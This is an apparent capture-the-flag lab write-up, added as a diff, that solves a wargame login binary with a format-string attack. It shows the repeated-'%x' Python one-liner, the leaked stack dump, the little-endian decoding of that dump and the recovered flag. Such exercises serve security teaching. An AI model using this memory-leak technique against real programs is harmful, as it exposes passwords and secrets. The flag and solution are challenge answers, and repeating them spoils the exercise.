@@ -1,0 +1,44 @@
+1. fuzzing
+
+Password input had no affect, hile the username leaked memory addresses.
+Only a certain amount of memory could be shown at once.
+
+python -c 'print "%x " * 36' | ./lab4C
+
+2. Reading the stack
+
+by doubling the format specifiers "%x %x", i was able to move up the stack
+to reach the complete 29 byte password. With only 1 "%x", 16 bytes were
+available but incomplete as a result.
+Adding " " or "." for user clarity will move the stack.
+
+
+
+
+
+lab4C@warzone:/levels/lab04$ python -c 'print "%x %x" * 36' | ./lab4C
+===== [ Secure Access System v1.0 ] =====
+-----------------------------------------
+- You must login to access this system. -
+-----------------------------------------
+--[ Username: --[ Password: -----------------------------------------
+bffff5a2 1e804a008 2578000078252078 2520782520782578 7825782525782520 7825207825207825 2078257878257825 2578252078252078 2520782520782578 7825782525782520 7825207825207825 2078257878257825 7825200 00 075620000 74315f377334775f 625f376e33745572 7230665f62343363 21653125207825 2078257878257825  does not have access!
+
+Password String : 74315f377334775f 625f376e33745572 7230665f62343363 216531
+
+# little endianness    msb <- lsb
+
+\x00\x62\x75\x37\x5f\x31\x74\x5f\x77\x34\x73\x6e\x37\x5f\x62\x72\x55\x74\x33\x5f\x66\x30\x72\x63\x33\x34\x62\x31\x65\x21
+
+
+flag: bu7_1t_w4sn7_brUt3_f0rc34b1e!
+
+>>> len('bu7_1t_w4sn7_brUt3_f0rc34b1e!')
+29
+
+
+
+
+
+
+
